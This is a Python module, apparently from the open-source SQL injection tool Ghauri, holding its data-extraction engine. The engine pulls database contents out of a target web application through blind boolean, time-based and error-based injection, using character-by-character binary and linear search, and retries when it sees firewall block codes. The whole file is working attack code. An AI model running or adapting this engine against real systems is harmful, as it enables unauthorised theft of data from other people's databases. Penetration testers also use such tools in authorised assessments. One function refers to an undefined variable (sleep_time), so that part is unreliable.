#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
import random
from ghauri.logger.colored_logger import logger
from ghauri.core.inject import inject_expression
from ghauri.common.colors import black, white, DIM, BRIGHT
from ghauri.common.lib import re, time, collections, quote, unquote
from ghauri.common.payloads import (
    NUMBER_OF_CHARACTERS_PAYLOADS,
    LENGTH_PAYLOADS,
    DATA_EXTRACTION_PAYLOADS,
    REGEX_XPATH,
    REGEX_ERROR_BASED,
    REGEX_BIGINT_BASED,
    REGEX_DOUBLE_BASED,
    REGEX_GEOMETRIC_BASED,
    REGEX_GTID_BASED,
    REGEX_JSON_KEYS,
    REGEX_GENERIC,
    REGEX_MSSQL_STRING,
    REGEX_GENERIC_ERRORS,
)
from ghauri.common.utils import (
    urlencode,
    replace_with,
    search_regex,
    headers_dict_to_str,
    check_boolean_responses,
    prepare_attack_request,
)


class GhauriExtractor:
    """aa"""

    def __init__(self, vectors="", is_string=False):
        self.vectors = vectors
        self.is_string = is_string

    def validate_character(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        match_string=None,
        suppress_output=False,
        query_check=False,
        identified_character=None,
        expression=None,
    ):
        #  we will validate character indendified in case of boolean based blind sqli only for now..
        is_valid = False
        if identified_character and expression:
            logger.debug(
                f"verifiying the identified character is correct or not: '{identified_character}'"
            )
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timesec=timesec,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=expression,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            if attack01:
                result, case, _ = check_boolean_responses(
                    base,
                    attack,
                    attack01,
                    match_string=match_string,
                )
                if result:
                    is_valid = True
                    logger.debug("character is valid..")
            else:
                response_time = attack.response_time
                if response_time >= sleep_time:
                    is_valid = True
        return is_valid

    def _binary_search(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        delay=0,
        timesec=5,
        timeout=30,
        proxy=None,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        text_only=False,
        is_multipart=False,
        suppress_output=False,
        query_check=False,
        minimum=None,
        maximum=None,
        offset=0,
        expression_payload=None,
        queryable=None,
        chars="",
        vector_type=None,
        retry=3,
    ):
        # need to implement retry mechanism in case of http connection related errors..
        if not minimum:
            minimum = 32
        if not maximum:
            maximum = 127
        ascii_char = 0
        is_found = False
        character = ""
        # logger.debug("performing a binary_search, for character..")
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        logger.progress(f"retrieved: {chars}")
        while not is_found:
            if http_firewall_code_counter > 2:
                message = f"{error_msg} - {http_firewall_code_counter} time(s)"
                logger.warning(f"HTTP error code detected during run:")
                choice = logger.read_input(
                    f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if choice == "q":
                    break
                if choice == "c":
                    http_firewall_code_counter = 0
            if retry_on_error >= retry:
                logger.warning(f"Ghauri detected connection errors multiple times")
                choice = logger.read_input(
                    f"how do you want to proceed? [(C)continue/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if choice == "q":
                    break
                if choice == "c":
                    retry_on_error = 0
            sleep_time = timesec
            if delay > 0:
                time.sleep(delay)
            ascii_char = int((minimum + maximum) / 2)
            if (minimum == ascii_char) & (maximum == ascii_char):
                is_found = True
                character = str(chr(ascii_char))
                logger.progress(f"retrieved: {chars}{character}")
                break
            condition = expression_payload.format(
                query=queryable, position=offset, char=ascii_char
            )
            condition = replace_with(string=condition, character="=", replace_with=">")
            expression = vector.replace("[INFERENCE]", f"{condition}")
            logger.payload(f"{expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                if attack.status_code in [403, 406]:
                    logger.critical(
                        f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
                    )
                    time.sleep(0.5)
                    error_msg = attack.error_msg
                    http_firewall_code_counter += 1
                    ascii_char = ascii_char
                    minimum = minimum
                    maximum = maximum
                    continue
                response_time = attack.response_time
                if attack01 and vector_type == "boolean_vector":
                    result, case, _ = check_boolean_responses(
                        base,
                        attack,
                        attack01,
                        code=code,
                        match_string=match_string,
                        not_match_string=not_match_string,
                        text_only=text_only,
                    )
                    if result:
                        minimum = ascii_char + 1
                        maximum = maximum
                    else:
                        minimum = minimum
                        maximum = ascii_char
                if vector_type == "time_vector":
                    if response_time >= sleep_time:
                        minimum = ascii_char + 1
                        maximum = maximum
                    else:
                        minimum = minimum
                        maximum = ascii_char
            except KeyboardInterrupt as error:
                logger.warning("user aborted during data extraction phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if quest and quest == "e":
                    raise error
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
        return character

    def _linear_search(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        injection_type,
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        suppress_output=False,
        expression_payload=None,
        queryable=None,
        chars="",
        offset=0,
        list_of_chars=None,
        retry=3,
    ):
        # need to implement retry mechanism in case of http connection related errors..
        character = ""
        start = 0
        end = len(list_of_chars)
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        while start < end:
            if http_firewall_code_counter > 2:
                message = f"{error_msg} - {http_firewall_code_counter} time(s)"
                logger.warning(f"HTTP error code detected during run:")
                choice = logger.read_input(
                    f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if choice == "q":
                    break
                if choice == "c":
                    http_firewall_code_counter = 0
            if retry_on_error >= retry:
                logger.warning(f"Ghauri detected connection errors multiple times")
                choice = logger.read_input(
                    f"how do you want to proceed? [(C)continue/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if choice == "q":
                    break
                if choice == "c":
                    retry_on_error = 0
            ascii_char = list_of_chars[start]
            if delay > 0:
                time.sleep(delay)
            sleep_time = timesec
            logger.progress(f"retrieved: {chars}{ascii_char}")
            condition = expression_payload.format(
                query=queryable, position=offset, char=ord(ascii_char)
            )
            expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                "[SLEEPTIME]", f"{sleep_time}"
            )
            logger.payload(f"{expression}")
            try:
                attack = inject_expression(
                    url=url,
                    data=data,
                    proxy=proxy,
                    delay=delay,
                    timesec=timesec,
                    timeout=timeout,
                    headers=headers,
                    parameter=parameter,
                    expression=expression,
                    is_multipart=is_multipart,
                    injection_type=injection_type,
                )
                if attack.status_code in [403, 406]:
                    logger.critical(
                        f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
                    )
                    time.sleep(0.5)
                    error_msg = attack.error_msg
                    http_firewall_code_counter += 1
                    continue
                start += 1
                response_time = attack.response_time
                if response_time >= sleep_time:
                    character += str(ascii_char)
                    # logger.debug(f"retrieved character: '{str(character)}'")
                    break
            except KeyboardInterrupt as error:
                logger.warning("user aborted during data extraction phase")
                quest = logger.read_input(
                    "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                    batch=False,
                    user_input="C",
                )
                if quest and quest == "e":
                    raise error
                if quest and quest == "q":
                    logger.error("user quit")
                    logger.end("ending")
                    exit(0)
            except ConnectionAbortedError as e:
                logger.critical(
                    f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionRefusedError as e:
                logger.critical(
                    f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except ConnectionResetError as e:
                logger.critical(
                    f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                )
                retry_on_error += 1
            except Exception as error:
                logger.critical(
                    f"error {error}, during detection phase. Ghauri is going to retry"
                )
                retry_on_error += 1
        return character

    def fetch_noc(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        suppress_output=False,
        text_only=False,
        vector_type=None,
    ):

        noc = 0
        working_query = ""
        logger.debug("fetching number of characters in length of query..")
        chars_extraction_payloads = NUMBER_OF_CHARACTERS_PAYLOADS.get(backend)
        if isinstance(chars_extraction_payloads, str):
            chars_extraction_payloads = [chars_extraction_payloads]
        for value in chars_extraction_payloads:
            is_noc_payload_found = False
            for entry in payloads:
                is_noc_found = False
                for i in range(1, 10):
                    if delay > 0:
                        time.sleep(delay)
                    sleep_time = timesec
                    condition = value.format(query=entry, char=i)
                    expression = vector.replace("[INFERENCE]", f"{condition}").replace(
                        "[SLEEPTIME]", f"{sleep_time}"
                    )
                    logger.payload(f"{expression}")
                    try:
                        attack = inject_expression(
                            url=url,
                            data=data,
                            proxy=proxy,
                            delay=delay,
                            timesec=timesec,
                            timeout=timeout,
                            headers=headers,
                            parameter=parameter,
                            expression=expression,
                            is_multipart=is_multipart,
                            injection_type=injection_type,
                        )
                    except KeyboardInterrupt as error:
                        logger.error(
                            "user interrupted during number of characters in length query retrieval.."
                        )
                        logger.end("ending")
                        exit(0)
                    if attack01 and vector_type == "boolean_vector":
                        result, case, _ = check_boolean_responses(
                            base,
                            attack,
                            attack01,
                            code=code,
                            match_string=match_string,
                            not_match_string=not_match_string,
                            text_only=text_only,
                        )
                        if result:
                            working_query = entry
                            logger.debug(
                                f"retrieved number of characters in length query {i}"
                            )
                            noc = i
                            is_noc_found = True
                            break
                    if vector_type == "time_vector":
                        response_time = attack.response_time
                        if response_time >= sleep_time:
                            working_query = entry
                            logger.debug(
                                f"retrieved number of characters in length query {i}"
                            )
                            noc = i
                            is_noc_found = True
                            break
                if is_noc_found:
                    is_noc_payload_found = True
                    break
            if is_noc_payload_found:
                break
        return noc, working_query

    def fetch_length(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        suppress_output=False,
        query_check=False,
        text_only=False,
        vector_type=None,
    ):

        noc, _ = self.fetch_noc(
            url,
            data,
            vector,
            parameter,
            headers,
            base,
            injection_type,
            payloads=payloads,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            attack01=attack01,
            code=code,
            match_string=match_string,
            not_match_string=not_match_string,
            suppress_output=suppress_output,
            text_only=text_only,
            vector_type=vector_type,
        )
        if query_check and noc > 0:
            return _
        length = 0
        if not suppress_output:
            logger.info(f"retrieving the length of query output")
        length_extraction_payloads = LENGTH_PAYLOADS.get(backend)
        if isinstance(length_extraction_payloads, str):
            length_extraction_payloads = [length_extraction_payloads]
        attack_url = url
        attack_data = data
        attack_headers = headers
        for value in length_extraction_payloads:
            is_length_found = False
            for entry in payloads:
                chars = ""
                for pos in range(1, noc + 1):
                    if attack01 and vector_type == "boolean_vector":
                        try:
                            retval = self._binary_search(
                                url=url,
                                data=data,
                                vector=vector,
                                parameter=parameter,
                                headers=headers,
                                base=base,
                                injection_type=injection_type,
                                delay=delay,
                                timesec=timesec,
                                timeout=timeout,
                                proxy=proxy,
                                attack01=attack01,
                                code=code,
                                match_string=match_string,
                                not_match_string=not_match_string,
                                is_multipart=is_multipart,
                                suppress_output=suppress_output,
                                query_check=query_check,
                                minimum=48,
                                maximum=58,
                                offset=pos,
                                expression_payload=value,
                                queryable=entry,
                                chars=chars,
                                text_only=text_only,
                                vector_type=vector_type,
                            )
                            chars += retval
                            logger.debug(f"character found: '{str(chars)}'")
                        except KeyboardInterrupt:
                            is_length_found = True
                            length = 0
                            break
                    if vector_type == "time_vector":
                        try:
                            retval = self._linear_search(
                                url=url,
                                data=data,
                                vector=vector,
                                parameter=parameter,
                                headers=headers,
                                injection_type=injection_type,
                                proxy=proxy,
                                is_multipart=is_multipart,
                                timeout=timeout,
                                delay=delay,
                                timesec=timesec,
                                suppress_output=suppress_output,
                                expression_payload=value,
                                queryable=entry,
                                chars=chars,
                                offset=pos,
                                list_of_chars="1203456789",
                            )
                            chars += retval
                            logger.debug(f"character found: '{str(chars)}'")
                        except KeyboardInterrupt:
                            is_length_found = True
                            length = 0
                            break
                if len(chars) == noc:
                    if not suppress_output:
                        logger.info(f"retrieved: {chars}")
                    length = int(chars) if chars.isdigit() else 0
                    is_length_found = True
                    break
            if is_length_found:
                break
        return length

    def fetch_using_error_based_vector(
        self,
        url,
        data,
        parameter,
        headers,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        suppress_output=False,
        query_check=False,
        text_only=False,
        retry=3,
    ):
        PayloadResponse = collections.namedtuple(
            "PayloadResponse",
            ["ok", "error", "result", "payload"],
        )
        _temp = PayloadResponse(ok=False, error="", result="", payload="")
        error_based_in_vectors = bool("error_vector" in self.vectors)
        start = 0
        end = len(payloads)
        http_firewall_code_counter = 0
        error_msg = None
        retry_on_error = 0
        if error_based_in_vectors:
            vector = self.vectors.get("error_vector")
            while start < end:
                if http_firewall_code_counter > 2:
                    message = f"{error_msg} - {http_firewall_code_counter} time(s)"
                    logger.warning(f"HTTP error code detected during run:")
                    choice = logger.read_input(
                        f"{message}. how do you want to proceed? [(C)continue/(q)uit] ",
                        batch=False,
                        user_input="C",
                    )
                    if choice == "q":
                        break
                    if choice == "c":
                        http_firewall_code_counter = 0
                if retry_on_error >= retry:
                    logger.warning(f"Ghauri detected connection errors multiple times")
                    choice = logger.read_input(
                        f"how do you want to proceed? [(C)continue/(q)uit] ",
                        batch=False,
                        user_input="C",
                    )
                    if choice == "q":
                        break
                    if choice == "c":
                        retry_on_error = 0
                entry = payloads[start]
                response_string = ""
                if delay > 0:
                    time.sleep(delay)
                expression = vector.replace("[INFERENCE]", f"{entry}")
                if backend == "Microsoft SQL Server":
                    expression = expression.replace("+", "%2b")
                logger.payload(f"{expression}")
                try:
                    attack = inject_expression(
                        url=url,
                        data=data,
                        proxy=proxy,
                        delay=delay,
                        timesec=timesec,
                        timeout=timeout,
                        headers=headers,
                        parameter=parameter,
                        expression=expression,
                        is_multipart=is_multipart,
                        injection_type=injection_type,
                    )
                    response_string = attack.filtered_text if text_only else attack.text
                    start += 1
                except KeyboardInterrupt as error:
                    logger.warning("user aborted during data extraction phase")
                    quest = logger.read_input(
                        "how do you want to proceed? [(C)continue/(e)nd this phase/(q)uit] ",
                        batch=False,
                        user_input="C",
                    )
                    if quest and quest == "e":
                        break
                    if quest and quest == "q":
                        logger.error("user quit")
                        logger.end("ending")
                        exit(0)
                except ConnectionAbortedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was aborted by the peer, Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionRefusedError as e:
                    logger.critical(
                        f"connection attempt to the target URL was refused by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except ConnectionResetError as e:
                    logger.critical(
                        f"connection attempt to the target URL was reset by the peer. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                except Exception as error:
                    logger.critical(
                        f"error {error}, during detection phase. Ghauri is going to retry"
                    )
                    retry_on_error += 1
                retval = search_regex(
                    pattern=(
                        REGEX_XPATH,
                        REGEX_ERROR_BASED,
                        REGEX_BIGINT_BASED,
                        REGEX_DOUBLE_BASED,
                        REGEX_GEOMETRIC_BASED,
                        REGEX_GTID_BASED,
                        REGEX_JSON_KEYS,
                        REGEX_GENERIC,
                        REGEX_MSSQL_STRING,
                        REGEX_GENERIC_ERRORS,
                    ),
                    string=response_string,
                    default=None,
                    group="error_based_response",
                )
                if retval:
                    if retval != "<blank_value>":
                        if backend == "Microsoft SQL Server":
                            if entry.endswith("sysobjects)") or entry.endswith(
                                "..syscolumns)"
                            ):
                                logger.debug(
                                    f"entries found with query '{entry}': {retval}, setting the return to 1 as we can't use where clause in query.."
                                )
                                retval = "1"
                                logger.warning(
                                    "the SQL query provided does not return any output"
                                )
                                logger.warning(
                                    "it was not possible to count the number of entries for the SQL query provided. Ghauri will assume that it returns only one entry"
                                )
                        _temp = PayloadResponse(
                            ok=True, error="", result=retval, payload=entry
                        )
                        break
        return _temp

    def fetch_characters(
        self,
        url,
        data,
        vector,
        parameter,
        headers,
        base,
        injection_type,
        payloads,
        backend="",
        proxy=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack01=None,
        code=None,
        match_string=None,
        not_match_string=None,
        suppress_output=False,
        query_check=False,
        list_of_chars=None,
        text_only=False,
    ):
        PayloadResponse = collections.namedtuple(
            "PayloadResponse",
            ["ok", "error", "result", "payload"],
        )
        _temp = PayloadResponse(ok=False, error="", result="", payload="")
        error_based_in_vectors = bool("error_vector" in self.vectors)
        retval_error = self.fetch_using_error_based_vector(
            url,
            data,
            parameter,
            headers,
            injection_type,
            payloads,
            backend=backend,
            proxy=proxy,
            is_multipart=is_multipart,
            timeout=timeout,
            delay=delay,
            timesec=timesec,
            suppress_output=suppress_output,
            query_check=query_check,
            text_only=text_only,
        )
        if retval_error.ok:
            _temp_error = PayloadResponse(
                ok=retval_error.ok,
                error=retval_error.error,
                result=retval_error.result,
                payload=retval_error.payload,
            )
            return _temp_error
        if not retval_error.ok and error_based_in_vectors:
            logger.debug(
                "ghauri is going to use other injected vectors payloads if any."
            )
        if not list_of_chars:
            list_of_chars = "._-1234567890aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ@+!#$%^&*()+"
        data_extraction_payloads = DATA_EXTRACTION_PAYLOADS.get(backend)
        if isinstance(data_extraction_payloads, dict):
            data_extraction_payloads = [data_extraction_payloads]
        attack_url = url
        attack_data = data
        attack_headers = headers
        user_aborted = False
        for vector_type, vector in self.vectors.items():
            if vector_type in ["error_vector"]:
                continue
            logger.debug(f"testing now with vector '{vector}'")
            length = self.fetch_length(
                url,
                data,
                vector,
                parameter,
                headers,
                base,
                injection_type,
                payloads=payloads,
                backend=backend,
                proxy=proxy,
                is_multipart=is_multipart,
                timeout=timeout,
                delay=delay,
                timesec=timesec,
                attack01=attack01,
                code=code,
                match_string=match_string,
                not_match_string=not_match_string,
                query_check=query_check,
                suppress_output=suppress_output,
                text_only=text_only,
                vector_type=vector_type,
            )
            if length == 0:
                logger.debug(
                    "it was not possible to extract query output length for the SQL query provided."
                )
                continue
            if query_check:
                return PayloadResponse(ok=True, error="", result="", payload=length)
            is_done_with_vector = False
            for entries in data_extraction_payloads:
                is_extracted = False
                for _, value in entries.items():
                    is_char_found = False
                    for entry in payloads:
                        chars = ""
                        for pos in range(1, length + 1):
                            if attack01 and vector_type == "boolean_vector":
                                # extract characters using binary search algorithm
                                try:
                                    retval = self._binary_search(
                                        url=url,
                                        data=data,
                                        vector=vector,
                                        parameter=parameter,
                                        headers=headers,
                                        base=base,
                                        injection_type=injection_type,
                                        delay=delay,
                                        timesec=timesec,
                                        timeout=timeout,
                                        proxy=proxy,
                                        attack01=attack01,
                                        code=code,
                                        match_string=match_string,
                                        not_match_string=not_match_string,
                                        is_multipart=is_multipart,
                                        suppress_output=suppress_output,
                                        query_check=query_check,
                                        minimum=32,
                                        maximum=127,
                                        offset=pos,
                                        expression_payload=value,
                                        queryable=entry,
                                        chars=chars,
                                        text_only=text_only,
                                        vector_type=vector_type,
                                    )
                                    chars += retval
                                    logger.debug(f"character(s) found: '{str(chars)}'")
                                except KeyboardInterrupt:
                                    is_char_found = True
                                    is_extracted = True
                                    is_done_with_vector = True
                                    _temp = PayloadResponse(
                                        ok=False,
                                        error="user_ended",
                                        result=chars,
                                        payload=entry,
                                    )
                                    break
                            if vector_type == "time_vector":
                                try:
                                    retval = self._linear_search(
                                        url=url,
                                        data=data,
                                        vector=vector,
                                        parameter=parameter,
                                        headers=headers,
                                        injection_type=injection_type,
                                        proxy=proxy,
                                        is_multipart=is_multipart,
                                        timeout=timeout,
                                        delay=delay,
                                        timesec=timesec,
                                        suppress_output=suppress_output,
                                        expression_payload=value,
                                        queryable=entry,
                                        chars=chars,
                                        offset=pos,
                                        list_of_chars=list_of_chars,
                                    )
                                    chars += retval
                                    logger.debug(f"character(s) found: '{str(chars)}'")
                                except KeyboardInterrupt:
                                    is_char_found = True
                                    is_extracted = True
                                    is_done_with_vector = True
                                    _temp = PayloadResponse(
                                        ok=False,
                                        error="user_ended",
                                        result=chars,
                                        payload=entry,
                                    )
                                    break
                        if len(chars) == length:
                            is_char_found = True
                            _temp = PayloadResponse(
                                ok=True, error="", result=chars, payload=entry
                            )
                            response = chars
                            break
                    if is_char_found:
                        is_extracted = True
                        break
                if is_extracted:
                    is_done_with_vector = True
                    break
            if not is_done_with_vector:
                logger.debug(
                    f"Ghauri was not able to extract the data with vector type '{vector_type}', switching to other vector type(s) if any.."
                )
            if is_done_with_vector:
                break
        return _temp


ghauri_extractor = GhauriExtractor()
